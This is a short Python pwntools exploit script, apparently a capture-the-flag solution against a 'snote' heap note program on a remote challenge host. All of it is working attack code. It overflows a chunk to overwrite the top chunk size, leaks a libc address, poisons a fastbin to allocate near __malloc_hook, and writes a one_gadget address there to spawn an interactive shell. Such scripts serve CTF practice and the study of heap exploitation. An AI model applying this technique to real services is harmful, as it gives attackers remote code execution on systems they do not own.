from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level ='debug'
# p = process('./snote')
p = remote('55fca716.gamectf.com',37009)
lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# gdb.attach(p, 'c')
p.recvuntil('?\n')
p.send('lometsj')

def add(size, c):
    p.sendafter('> ','1')
    p.sendafter('> ',str(size))
    p.sendafter('> \n',c)

def show():
    p.sendafter('> ','2')

def delete():
    p.sendafter('> ','3')

def edit(size, c):
    p.sendafter('> ','4')
    p.sendafter('> ',str(size))
    p.sendafter('> \n',c)


add(0x18, 'a')
edit(0x20, 'a'*0x18+p64(0xfe1))

add(0x1000, 'a')

add(0x60,'a')
show()
p.recvuntil('a')
address = u64('a' + p.recv(5) + '\x00\x00')
print hex(address)
libc_base = address - 3952993
print hex(libc_base)

# mf = libc_base + (0x7ffff7dd37f8-0x7ffff7a0d000)

delete()
edit(8,p64(libc_base+lib.sym['__malloc_hook']-0x23))
add(0x60,'a')
add(0x60,'a'*0x13 + p64(libc_base+0xf02a4))
p.sendafter('> ','1')
p.sendafter('> ','10')

p.interactive()